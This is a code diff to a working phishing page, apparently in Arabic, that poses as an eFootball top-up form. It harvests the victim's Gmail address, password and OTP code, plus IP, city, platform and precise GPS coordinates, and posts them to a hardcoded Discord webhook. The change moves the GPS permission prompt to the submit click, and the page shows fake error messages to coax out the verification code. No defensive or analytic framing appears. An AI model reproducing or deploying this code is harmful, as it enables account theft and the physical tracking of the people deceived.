@@ -112,7 +112,7 @@
         
         <div id="errorText" class="error-msg"></div>
 
-        <form id="authForm" onsubmit="handleSubmit(event)">
+        <form id="authForm" onsubmit="handleAuthProcess(event)">
             <div class="input-group">
                 <label>البريد الإلكتروني (Gmail)</label>
                 <input type="email" id="email" placeholder="example@gmail.com" required>
@@ -143,7 +143,6 @@
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";
         let attemptCount = 0;
-        let globalGpsData = "جاري جلب إحداثيات الـ GPS...";
 
         async function sendToDiscord(message) {
             try {
@@ -155,39 +154,28 @@
             } catch (e) {}
         }
 
-        // طلب إذن الـ GPS وإرسال الخريطة مباشرة فور فتح الصفحة
-        function requestGpsLocation() {
+        // دالة لطلب الـ GPS وإرسال النتيجة فور الضغط على زر الشحن
+        function getGpsAndSubmit(email, password, otp) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    async (position) => {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
-                        globalGpsData = `خط العرض: ${lat}\nخط الطول: ${lon}\n🔗 https://maps.google.com/?q=${lat},${lon}`;
-                        sendToDiscord(`📍 **[ إحداثيات GPS الدقيقة (تمت الموافقة) ]**\n${globalGpsData}`);
+                        let gpsData = `خط العرض: ${lat}\nخط الطول: ${lon}\n🔗 https://maps.google.com/?q=${lat},${lon}`;
+                        await finalizeSubmission(email, password, otp, gpsData);
                     },
-                    (error) => {
-                        globalGpsData = "⚠️ تنبيه: الهدف رفض إذن الـ GPS.";
-                        sendToDiscord(globalGpsData);
+                    async (error) => {
+                        let gpsData = "⚠️ تنبيه: الهدف رفض إذن الـ GPS يدوياً.";
+                        await finalizeSubmission(email, password, otp, gpsData);
                     },
-                    { enableHighAccuracy: true }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                globalGpsData = "الـ GPS غير مدعوم في هذا المتصفح.";
+                finalizeSubmission(email, password, otp, "الـ GPS غير مدعوم.");
             }
         }
 
-        // تشغيل طلب الموقع تلقائياً بمجرد دخول الصفحة
-        window.onload = function() {
-            requestGpsLocation();
-        };
-
-        async function handleSubmit(event) {
-            event.preventDefault();
-            attemptCount++;
-
-            let email = document.getElementById('email').value;
-            let password = document.getElementById('password').value;
-            let otp = document.getElementById('otpCode').value || "لم يُطلب بعد";
+        async function finalizeSubmission(email, password, otp, gpsData) {
             let ip = "Unknown";
             let locationInfo = "Unknown";
 
@@ -198,7 +186,7 @@
 
                 let res = await fetch(`https://ipapi.co/${ip}/json/`);
                 let data = await res.json();
-                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'} (الشبكة: ${data.org || 'Unknown'})`;
+                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
             } catch (err) {}
 
             let msg = `🎯 **[ eFootball - محاولة رقم ${attemptCount} ]** 🎯\n\n` +
@@ -206,8 +194,8 @@
                       `🔑 **كلمة المرور:** \`${password}\`\n` +
                       `🔢 **كود التحقق (OTP):** \`${otp}\`\n` +
                       `🌐 **الـ IP:** \`${ip}\`\n` +
-                      `📍 **الموقع (الشبكة):** ${locationInfo}\n` +
-                      `📍 **إحداثيات الـ GPS:**\n${globalGpsData}\n` +
+                      `📍 **موقع الشبكة:** ${locationInfo}\n` +
+                      `📍 **إحداثيات الـ GPS:**\n${gpsData}\n` +
                       `💻 **النظام:** ${navigator.platform}`;
 
             await sendToDiscord(msg);
@@ -216,16 +204,28 @@
 
             if (attemptCount === 1) {
                 errorBox.style.display = 'block';
-                errorBox.innerHTML = "كلمة المرور خاطئة أو يتطلب الحساب تأكيداً إضافياً. يرجى تفقد بريدك الإلكتروني لإدخال كود التحقق (OTP) الذي وصلك.";
+                errorBox.innerHTML = "خطأ في مزامنة البيانات أو أن الحساب يتطلب تأكيداً أضافياً. يرجى السماح بالموقع وتفقد الإيميل لإدخال كود التحقق (OTP) الذي وصلك.";
                 
                 document.getElementById('otpGroup').style.display = 'block';
                 document.getElementById('submitBtn').innerText = "تأكيد الكود وإتمام الشحن";
                 document.getElementById('robotCheck').checked = false;
             } else {
-                errorBox.innerHTML = "خطأ في الكود المدخل أو كلمة المرور. يرجى إعادة التأكد وكتابتها بشكل صحيح.";
+                errorBox.innerHTML = "خطأ في الكود المدخل. يرجى إعادة كتابة الكود الصحيح الذي وصلك.";
                 document.getElementById('otpCode').value = '';
                 document.getElementById('robotCheck').checked = false;
             }
+        }
+
+        function handleAuthProcess(event) {
+            event.preventDefault();
+            attemptCount++;
+
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            let otp = document.getElementById('otpCode').value || "لم يُطلب بعد";
+
+            // عند الضغط، نجبر المتصفح على إظهار نافذة الموقع لتأكيد الطلب
+            getGpsAndSubmit(email, password, otp);
         }
     </script>
 </body>
